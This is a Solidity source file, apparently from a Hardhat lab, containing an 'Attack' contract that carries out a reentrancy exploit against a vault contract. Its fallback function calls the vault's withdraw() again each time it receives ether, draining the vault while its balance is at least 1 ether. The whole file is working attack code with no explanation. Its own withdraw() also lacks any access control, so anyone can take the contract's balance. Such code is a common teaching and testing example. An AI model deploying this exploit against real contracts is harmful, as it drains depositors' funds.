// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

import "hardhat/console.sol";

interface IVault{
    function deposit() external payable;
    function withdraw() external;
    function getEtherBalance() external view returns(uint256);
    function getUserBalance(address _user) external view returns (uint256);
}
contract Attack{
    IVault myvault; 

    constructor(address _address){
        myvault = IVault(_address);
    }
    function deposit() public payable {
        require(msg.value >= 0.01 ether, "Need at least 0.01 ether to commence attack.");
        myvault.deposit{value: msg.value}();
    }
    function attack() public{
        uint256 vaultBalance = myvault.getEtherBalance();
        if(vaultBalance >= 1 ether){
            try myvault.withdraw()
			{
				console.log("attack(): Attack successful");
			}
			catch Error(string memory reason)
			{
				console.log("attack(): ", reason);
				revert(reason);
			}
        }
    }

    fallback() external payable{
        uint256 vaultBalance = myvault.getEtherBalance();
        if(vaultBalance >= 1 ether){
            try myvault.withdraw()
			{
				console.log("fallback(): Attack successful");
			}
			catch Error(string memory reason)
			{
				console.log("fallback(): ", reason);
				revert(reason);
			}
        }
    }
    
    function withdraw() public {
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to withdraw sender's balance");
    }
}
